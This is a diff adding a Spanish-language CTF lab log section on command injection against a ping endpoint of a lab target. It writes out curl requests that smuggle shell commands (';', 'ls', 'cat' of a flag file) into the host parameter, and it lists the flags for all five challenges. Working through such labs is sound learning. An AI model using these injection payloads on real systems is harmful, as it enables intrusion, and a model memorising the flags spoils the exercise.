@@ -68,3 +68,58 @@ docker exec cyberlab-attacker bash /tmp/lab07-ctf/ctf status 07
 # preparada para solucionar problemas de compatibilidad entre Windows y Linux.
 # El estado obtenido corresponde a esa copia temporal y se conserva en
 # evidencia/salidas/r5-status-07.txt.
+
+# ==========================================
+# R3 — Inyección de comandos / RCE
+# Responsable: Carolina Suppo
+# ==========================================
+
+# Entorno: consola atacante (cyberlab-attacker).
+# Los comandos con comillas anidadas se lanzaron mediante scripts guardados
+# en /loot (compartido con .loot/ del host) para evitar problemas de quoting
+# al pasarlos por PowerShell y docker exec.
+
+# Línea base: ping legítimo contra el endpoint autorizado.
+curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode "host=127.0.0.1" | tee /loot/r3-ping-base.txt
+# Observado: "$ ping -c1 127.0.0.1" y "/bin/sh: 1: ping: not found".
+# La salida delata que host se concatena a un comando de shell.
+
+# Pruebas de separadores (scripts r3-probe.sh y r3-probe2.sh en /loot):
+#   host=127.0.0.1; ls /             -> lista el raíz: confirma ejecución
+#   host=127.0.0.1; echo INYECTADO   -> devuelve "INYECTADO"
+#   host=127.0.0.1$(echo INYECTADO)  -> sin salida visible (la sustitución
+#                                       queda dentro del argumento de ping)
+#   separadores ; | &&               -> el segundo comando sí se ejecuta;
+#                                       las pruebas con $() y backticks se
+#                                       conservan en /loot/r3-injection-*.txt
+
+# Localización del archivo autorizado dentro del target.
+curl -sS -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; ls -la /app' | tee /loot/r3-ls-app.txt
+curl -sS -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; ls -la /app/flags' | tee /loot/r3-ls-flags.txt
+# Observado: el directorio /app/flags contiene cmdi.txt y lfi.txt.
+
+# Lectura mínima autorizada (evidencia confirmatoria del reto).
+curl -sS -i -G http://phantomcorp/herramientas/ping --data-urlencode 'host=127.0.0.1; cat /app/flags/cmdi.txt' | tee /loot/r3-command-injection.txt
+# Resultado observado: FLAG{command_injection_rce}
+
+# Registro de la flag en el motor (Git Bash, desde la raíz del repositorio).
+./ctf submit 07 R3 'FLAG{command_injection_rce}'
+# Resultado: Reto R3 resuelto correctamente.
+
+# Reenvío de las flags R1/R2/R4/R5 presentadas por el resto del equipo:
+# sus envíos originales no quedaron registrados en .progreso del host
+# (los validadores temporales no persisten), por lo que se volvieron a
+# presentar sin alterar ninguna evidencia ajena.
+./ctf submit 07 R1 'FLAG{sqli_auth_bypass}'
+./ctf submit 07 R2 'FLAG{sqli_union_dump}'
+./ctf submit 07 R4 'FLAG{path_traversal_lfi}'
+./ctf submit 07 R5 'FLAG{idor_broken_access}'
+
+# Estado final del laboratorio: 5/5.
+./ctf status 07
+# Salida íntegra conservada en evidencia/salidas/status-07.txt.
+
+# Copiar evidencias al directorio de entrega
+cp .loot/r3-ping-base.txt .loot/r3-ls-app.txt .loot/r3-ls-flags.txt .loot/r3-command-injection.txt entregas/lab07/grupo06/evidencia/salidas/
+cp .loot/r3-submit.txt .loot/r3-status-07.txt entregas/lab07/grupo06/evidencia/salidas/
+mv entregas/lab07/grupo06/evidencia/salidas/r3-status-07.txt entregas/lab07/grupo06/evidencia/salidas/status-07.txt
